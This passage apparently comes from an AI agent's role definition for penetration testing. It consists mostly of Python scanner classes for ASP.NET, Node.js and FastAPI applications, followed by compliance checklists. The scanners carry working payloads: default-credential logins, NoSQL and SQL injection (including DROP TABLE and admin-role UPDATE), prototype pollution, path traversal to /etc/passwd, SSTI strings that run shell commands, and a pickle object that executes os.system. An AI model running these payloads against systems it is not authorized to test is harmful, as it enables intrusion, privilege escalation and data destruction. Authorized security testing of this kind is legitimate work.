        model_endpoints = ['/api/users', '/api/profile', '/api/account/update']
        
        for endpoint in model_endpoints:
            for payload in mass_assignment_payloads:
                try:
                    # Test PUT request
                    response = self.session.put(f"{self.target}{endpoint}/1", 
                                               json=payload, timeout=10)
                    
                    if response.status_code == 200:
                        # Check if dangerous properties were accepted
                        if any(key in str(payload.keys()).lower() 
                              for key in ['admin', 'role', 'permission']):
                            self.vulnerabilities.append({
                                'type': 'Mass Assignment Vulnerability',
                                'severity': 'High',
                                'endpoint': endpoint,
                                'payload': payload,
                                'evidence': 'Dangerous properties accepted in model binding',
                                'impact': 'Privilege escalation and unauthorized access'
                            })
                    
                    # Test POST request
                    post_response = self.session.post(f"{self.target}{endpoint}", 
                                                     json=payload, timeout=10)
                    
                    if post_response.status_code in [200, 201]:
                        self.vulnerabilities.append({
                            'type': 'Mass Assignment in Create Operation',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'payload': payload,
                            'evidence': 'Created object with dangerous properties',
                            'impact': 'Unauthorized account creation with elevated privileges'
                        })
                        
                except Exception as e:
                    continue
    
    def test_identity_vulnerabilities(self):
        """Test ASP.NET Core Identity vulnerabilities"""
        
        # Test for default admin accounts
        default_creds = [
            {'Email': 'admin@admin.com', 'Password': 'Admin123!'},
            {'Email': 'administrator@test.com', 'Password': 'Password123!'},
            {'Email': 'admin@localhost', 'Password': 'admin'},
            {'Username': 'admin', 'Password': 'admin'}
        ]
        
        login_endpoints = ['/Account/Login', '/api/auth/login', '/login']
        
        for endpoint in login_endpoints:
            for creds in default_creds:
                try:
                    response = self.session.post(f"{self.target}{endpoint}", 
                                                data=creds, timeout=10)
                    
                    # Check for successful authentication
                    success_indicators = [
                        'dashboard', 'welcome', 'logout', 'profile',
                        'authentication successful', 'login successful'
                    ]
                    
                    for indicator in success_indicators:
                        if indicator.lower() in response.text.lower():
                            self.vulnerabilities.append({
                                'type': 'Default Credentials',
                                'severity': 'Critical',
                                'endpoint': endpoint,
                                'credentials': creds,
                                'evidence': f"Successfully authenticated with: {creds}",
                                'impact': 'Administrative access with default credentials'
                            })
                            break
                            
                except Exception as e:
                    continue
```

### Node.js/Express Application Testing

**Recommended Pattern:** JavaScript-specific vulnerabilities with NoSQL injection and prototype pollution

```python
# nodejs_pentest.py
import requests
import json

class NodeJSPentest:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_nodejs_vulnerabilities(self):
        """Test Node.js/Express specific vulnerabilities"""
        
        # NoSQL injection (MongoDB)
        self.test_nosql_injection()
        
        # Prototype pollution
        self.test_prototype_pollution()
        
        # Express.js vulnerabilities
        self.test_express_vulnerabilities()
        
        # JWT vulnerabilities
        self.test_nodejs_jwt_issues()
        
        # Package vulnerabilities
        self.test_known_package_vulns()
        
        return self.vulnerabilities
    
    def test_nosql_injection(self):
        """Test for NoSQL injection vulnerabilities"""
        nosql_payloads = [
            {"$ne": null},
            {"$gt": ""},
            {"$where": "this.username == this.password"},
            {"$regex": ".*"},
            {"username": {"$ne": null}, "password": {"$ne": null}},
            {"$or": [{"username": "admin"}, {"username": "administrator"}]}
        ]
        
        # Test authentication bypass
        auth_endpoints = ['/api/login', '/auth', '/login']
        
        for endpoint in auth_endpoints:
            for payload in nosql_payloads:
                test_data = {
                    "username": payload,
                    "password": payload
                }
                
                try:
                    response = self.session.post(f"{self.target}{endpoint}", 
                                               json=test_data, timeout=10)
                    
                    # Check for successful authentication
                    if response.status_code == 200:
                        response_data = response.json() if response.headers.get('content-type', '').startswith('application/json') else {}
                        
                        if any(key in response_data for key in ['token', 'success', 'authenticated']):
                            self.vulnerabilities.append({
                                'type': 'NoSQL Injection Authentication Bypass',
                                'severity': 'Critical',
                                'endpoint': endpoint,
                                'payload': payload,
                                'evidence': 'Successfully bypassed authentication',
                                'impact': 'Complete authentication bypass'
                            })
                            
                except Exception as e:
                    continue
        
        # Test data extraction
        search_endpoints = ['/api/search', '/api/users', '/api/find']
        
        for endpoint in search_endpoints:
            extraction_payloads = [
                {"$where": "return true"},
                {"$regex": "^.*"},
                {"$exists": True}
            ]
            
            for payload in extraction_payloads:
                try:
                    response = self.session.get(f"{self.target}{endpoint}", 
                                               params={'query': json.dumps(payload)}, 
                                               timeout=10)
                    
                    if response.status_code == 200:
                        try:
                            data = response.json()
                            if isinstance(data, list) and len(data) > 0:
                                self.vulnerabilities.append({
                                    'type': 'NoSQL Injection Data Extraction',
                                    'severity': 'High',
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'evidence': f"Extracted {len(data)} records",
                                    'impact': 'Unauthorized data access'
                                })
                        except:
                            pass
                            
                except Exception as e:
                    continue
    
    def test_prototype_pollution(self):
        """Test for prototype pollution vulnerabilities"""
        pollution_payloads = [
            {"__proto__": {"admin": True}},
            {"constructor": {"prototype": {"admin": True}}},
            {"__proto__.admin": True},
            {"constructor.prototype.admin": True}
        ]
        
        # Test various endpoints that might process JSON
        test_endpoints = ['/api/config', '/api/settings', '/api/profile', '/api/update']
        
        for endpoint in test_endpoints:
            for payload in pollution_payloads:
                try:
                    # Send pollution payload
                    response = self.session.post(f"{self.target}{endpoint}", 
                                                json=payload, timeout=10)
                    
                    # Test if pollution was successful by checking a different endpoint
                    test_response = self.session.get(f"{self.target}/api/user", timeout=10)
                    
                    if test_response.status_code == 200:
                        try:
                            test_data = test_response.json()
                            if test_data.get('admin') == True:
                                self.vulnerabilities.append({
                                    'type': 'Prototype Pollution',
                                    'severity': 'High',
                                    'endpoint': endpoint,
                                    'payload': payload,
                                    'evidence': 'Successfully polluted prototype with admin property',
                                    'impact': 'Privilege escalation and application logic bypass'
                                })
                        except:
                            pass
                            
                except Exception as e:
                    continue
    
    def test_express_vulnerabilities(self):
        """Test Express.js specific vulnerabilities"""
        
        # Test for path traversal
        traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd',
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd'
        ]
        
        file_endpoints = ['/api/file', '/download', '/static', '/public']
        
        for endpoint in file_endpoints:
            for payload in traversal_payloads:
                try:
                    response = self.session.get(f"{self.target}{endpoint}", 
                                               params={'file': payload, 'path': payload}, 
                                               timeout=10)
                    
                    # Check for file contents
                    if 'root:' in response.text or 'localhost' in response.text:
                        self.vulnerabilities.append({
                            'type': 'Path Traversal',
                            'severity': 'High',
                            'endpoint': endpoint,
                            'payload': payload,
                            'evidence': 'Successfully read system files',
                            'impact': 'Unauthorized file system access'
                        })
                        
                except Exception as e:
                    continue
        
        # Test for SSTI (Server-Side Template Injection)
        ssti_payloads = [
            '{{7*7}}',
            '${7*7}',
            '<%= 7*7 %>',
            '{{config}}',
            '{{constructor.constructor("return process")()}}'
        ]
        
        template_params = ['template', 'message', 'content', 'text']
        
        for param in template_params:
            for payload in ssti_payloads:
                try:
                    test_data = {param: payload}
                    response = self.session.post(f"{self.target}/api/render", 
                                                json=test_data, timeout=10)
                    
                    # Check if template was evaluated
                    if payload in ['{{7*7}}', '${7*7}', '<%= 7*7 %>']:
                        if '49' in response.text:
                            self.vulnerabilities.append({
                                'type': 'Server-Side Template Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Mathematical expression evaluated: 7*7=49',
                                'impact': 'Remote code execution possible'
                            })
                            
                except Exception as e:
                    continue
```

### Python/FastAPI Application Testing

**Recommended Pattern:** Python-specific testing with SQLAlchemy injection and pickle deserialization

```python
# python_fastapi_pentest.py
import requests
import pickle
import base64
import json

class PythonFastAPIPentest:
    def __init__(self, target_url):
        self.target = target_url
        self.session = requests.Session()
        self.vulnerabilities = []
    
    def test_python_vulnerabilities(self):
        """Test Python/FastAPI specific vulnerabilities"""
        
        # SQLAlchemy injection
        self.test_sqlalchemy_injection()
        
        # Python pickle deserialization
        self.test_pickle_deserialization()
        
        # FastAPI automatic docs exposure
        self.test_fastapi_docs_exposure()
        
        # Python template injection
        self.test_python_ssti()
        
        # Pydantic model bypasses
        self.test_pydantic_bypasses()
        
        return self.vulnerabilities
    
    def test_sqlalchemy_injection(self):
        """Test for SQLAlchemy ORM injection"""
        sqlalchemy_payloads = [
            "' OR 1=1--",
            "'; DROP TABLE users--",
            "' UNION SELECT password FROM users WHERE username='admin'--",
            "'; UPDATE users SET role='admin' WHERE username='victim'--"
        ]
        
        # Common SQLAlchemy endpoint patterns
        sql_endpoints = ['/api/search', '/api/filter', '/api/query']
        
        for endpoint in sql_endpoints:
            for payload in sqlalchemy_payloads:
                test_params = {'q': payload, 'search': payload, 'filter': payload}
                
                try:
                    response = self.session.get(f"{self.target}{endpoint}", 
                                              params=test_params, timeout=10)
                    
                    # Check for SQLAlchemy error messages
                    sqlalchemy_errors = [
                        'sqlalchemy.exc.ProgrammingError',
                        'sqlalchemy.exc.IntegrityError',
                        'psycopg2.errors.SyntaxError',
                        'sqlite3.OperationalError'
                    ]
                    
                    for error in sqlalchemy_errors:
                        if error in response.text:
                            self.vulnerabilities.append({
                                'type': 'SQLAlchemy Injection',
                                'severity': 'Critical',
                                'endpoint': endpoint,
                                'payload': payload,
                                'evidence': f"SQLAlchemy error: {error}",
                                'impact': 'Database access and manipulation'
                            })
                            break
                            
                except Exception as e:
                    continue
    
    def test_pickle_deserialization(self):
        """Test for unsafe pickle deserialization"""
        
        # Create malicious pickle payload
        class MaliciousPayload:
            def __reduce__(self):
                import os
                return (os.system, ('echo "PICKLE_RCE_TEST"',))
        
        malicious_pickle = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()
        
        # Test endpoints that might deserialize data
        pickle_endpoints = ['/api/deserialize', '/api/load', '/api/import', '/api/restore']
        
        for endpoint in pickle_endpoints:
            test_data = {
                'data': malicious_pickle,
                'pickle_data': malicious_pickle,
                'serialized': malicious_pickle
            }
            
            try:
                response = self.session.post(f"{self.target}{endpoint}", 
                                           json=test_data, timeout=10)
                
                # Check if command was executed
                if 'PICKLE_RCE_TEST' in response.text:
                    self.vulnerabilities.append({
                        'type': 'Unsafe Pickle Deserialization',
                        'severity': 'Critical',
                        'endpoint': endpoint,
                        'evidence': 'Successfully executed command via pickle',
                        'impact': 'Remote code execution'
                    })
                    
            except Exception as e:
                continue
    
    def test_fastapi_docs_exposure(self):
        """Test for FastAPI automatic documentation exposure"""
        docs_endpoints = ['/docs', '/redoc', '/openapi.json']
        
        for endpoint in docs_endpoints:
            try:
                response = self.session.get(f"{self.target}{endpoint}", timeout=10)
                
                if response.status_code == 200:
                    # Check for sensitive information in API docs
                    if endpoint == '/openapi.json':
                        try:
                            openapi_spec = response.json()
                            
                            # Look for sensitive endpoints
                            paths = openapi_spec.get('paths', {})
                            sensitive_paths = [path for path in paths.keys() 
                                             if any(keyword in path.lower() 
                                                   for keyword in ['admin', 'secret', 'internal', 'debug'])]
                            
                            if sensitive_paths:
                                self.vulnerabilities.append({
                                    'type': 'FastAPI Sensitive Endpoints Exposure',
                                    'severity': 'Medium',
                                    'endpoint': endpoint,
                                    'evidence': f"Sensitive endpoints exposed: {sensitive_paths}",
                                    'impact': 'Information disclosure of internal APIs'
                                })
                        except:
                            pass
                    
                    else:
                        self.vulnerabilities.append({
                            'type': 'FastAPI Documentation Exposure',
                            'severity': 'Low',
                            'endpoint': endpoint,
                            'evidence': 'API documentation publicly accessible',
                            'impact': 'API structure and endpoint disclosure'
                        })
                        
            except Exception as e:
                continue
    
    def test_python_ssti(self):
        """Test for Python Server-Side Template Injection"""
        ssti_payloads = [
            '{{7*7}}',
            '{{config}}',
            "{{''.__class__.__mro__[1].__subclasses__()}}",
            '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
            '{%for c in [].__class__.__base__.__subclasses__()%}{%if c.__name__=="catch_warnings"%}{{c.__init__.__globals__["__builtins__"]["eval"]("__import__(\"os\").system(\"whoami\")")}}{%endif%}{%endfor%}'
        ]
        
        template_params = ['template', 'message', 'content', 'text', 'body']
        
        for param in template_params:
            for payload in ssti_payloads:
                try:
                    test_data = {param: payload}
                    response = self.session.post(f"{self.target}/api/render", 
                                                json=test_data, timeout=10)
                    
                    # Check if template was evaluated
                    if payload == '{{7*7}}':
                        if '49' in response.text:
                            self.vulnerabilities.append({
                                'type': 'Python Server-Side Template Injection',
                                'severity': 'Critical',
                                'parameter': param,
                                'payload': payload,
                                'evidence': 'Mathematical expression evaluated: 7*7=49',
                                'impact': 'Remote code execution possible'
                            })
                    
                    # Check for config exposure
                    elif payload == '{{config}}' and 'SECRET_KEY' in response.text:
                        self.vulnerabilities.append({
                            'type': 'Python Configuration Exposure via SSTI',
                            'severity': 'High',
                            'parameter': param,
                            'payload': payload,
                            'evidence': 'Application configuration exposed',
                            'impact': 'Sensitive configuration disclosure'
                        })
                        
                except Exception as e:
                    continue
```

## 📊 Compliance and Audit Integration

### Security Audit Checklist

```yaml
compliance_audit_checklist:
  owasp_top_10_2021:
    - broken_access_control: "Check for proper authorization controls"
    - cryptographic_failures: "Verify encryption implementation"
    - injection_attacks: "Test for SQL, NoSQL, OS injection"
    - insecure_design: "Review security design patterns"
    - security_misconfiguration: "Audit configuration settings"
    - vulnerable_components: "Check for outdated dependencies"
    - identification_failures: "Test authentication mechanisms"
    - software_data_integrity: "Verify software supply chain"
    - logging_monitoring: "Check security event logging"
    - server_side_forgery: "Test for SSRF vulnerabilities"
    
  pci_dss_requirements:
    - network_security: "Firewall and network segmentation"
    - account_data_protection: "Cardholder data encryption"
    - vulnerability_management: "Regular security testing"
    - access_control: "Role-based access implementation"
    - monitoring: "Security event logging and monitoring"
    - security_policies: "Information security policy compliance"
    
  gdpr_security_requirements:
    - data_protection_by_design: "Privacy by design implementation"
    - data_encryption: "Personal data encryption validation"
    - access_controls: "Data subject access controls"
    - breach_detection: "Data breach detection capabilities"
    - vendor_management: "Third-party security validation"
```

## 📤 Deliverables

- **Penetration Test Plan** with scope, methodology, and timeline
- **Vulnerability Assessment Report** with detailed findings and evidence
- **Risk Assessment Matrix** with business impact analysis
- **Executive Summary** with key findings and recommendations
- **Technical Remediation Guide** with step-by-step fix instructions
- **Compliance Audit Results** mapped to regulatory requirements
- **Penetration Test Artifacts** including scripts, payloads, and evidence

## 🤝 Collaboration Points

**With deployment-engineer:** Infrastructure hardening and security configuration
**With api-engineer:** Secure coding practices and API security validation
**With reviewer:** Security findings validation and remediation prioritization
**With qa-engineer:** Security testing integration and automation
**With business-analyst:** Business impact assessment and risk communication

### Generic/Fallback Implementation

For unsupported technologies, provide generic penetration testing patterns:

```yaml
# Generic Penetration Testing Configuration
penetration_testing:
  approach: "owasp_methodology"  # or "nist_sp_800_115", "ptes", "osstmm"
  
  reconnaissance_techniques:
    - "passive_information_gathering"
    - "dns_enumeration_and_subdomain_discovery"
    - "certificate_transparency_analysis"
    - "social_media_and_osint_collection"
    - "technology_stack_fingerprinting"
    
  vulnerability_assessment:
    - "network_service_scanning_and_enumeration"
    - "web_application_security_testing"
    - "database_security_assessment"
    - "authentication_and_session_management_testing"
    - "input_validation_and_injection_testing"
    
  exploitation_techniques:
    - "automated_vulnerability_exploitation"
    - "manual_exploitation_verification"
    - "privilege_escalation_testing"
    - "lateral_movement_assessment"
    - "data_exfiltration_simulation"
    
  reporting_standards:
    - "executive_summary_with_risk_assessment"
    - "detailed_technical_findings_documentation"
    - "proof_of_concept_evidence_collection"
    - "remediation_recommendations_prioritized"
    - "compliance_mapping_to_frameworks"
```

## Implementation Strategy

### 1. Technology Detection

Analyze CLAUDE.md configuration to determine:
- **Application Technology** from primary_language for appropriate vulnerability testing tools and techniques
- **Database Technology** to select proper injection testing methods and database-specific exploits
- **Framework Patterns** for technology-specific vulnerability classes and security misconfigurations
- **Business Domain** for compliance-focused testing and industry-specific threat scenarios

### 2. Testing Methodology Selection

Select penetration testing approaches based on detected requirements:
- **Web Applications**: OWASP testing methodology with framework-specific vulnerability classes
- **API Testing**: Technology-appropriate API security testing with authentication bypass techniques
- **Database Security**: Database-specific injection testing and access control validation
- **Infrastructure**: Network service testing and system-level exploitation techniques

### 3. Vulnerability Exploitation Strategy

Apply technology-specific exploitation techniques:
- **Framework Exploits**: Technology-appropriate exploit modules and proof-of-concept development
- **Business Logic Testing**: Domain-specific attack scenarios and privilege escalation paths
- **Compliance Testing**: Regulatory framework validation and gap assessment
- **Custom Payload Development**: Technology-specific exploit payloads and attack vectors

### 4. Success Criteria

Penetration testing validation checklist:
- **Technology Coverage**: All identified technologies tested with appropriate tools and techniques
- **Vulnerability Classification**: Findings properly categorized with technology-specific impact assessment
- **Exploit Verification**: Successful exploitation demonstrated with proof-of-concept evidence
- **Risk Assessment**: Business impact evaluated based on domain-specific threat landscape
- **Remediation Guidance**: Technology-appropriate fix recommendations and implementation guidance

---
*Comprehensive penetration testing validates security controls and identifies vulnerabilities before attackers can exploit them, ensuring robust defense against real-world threats.*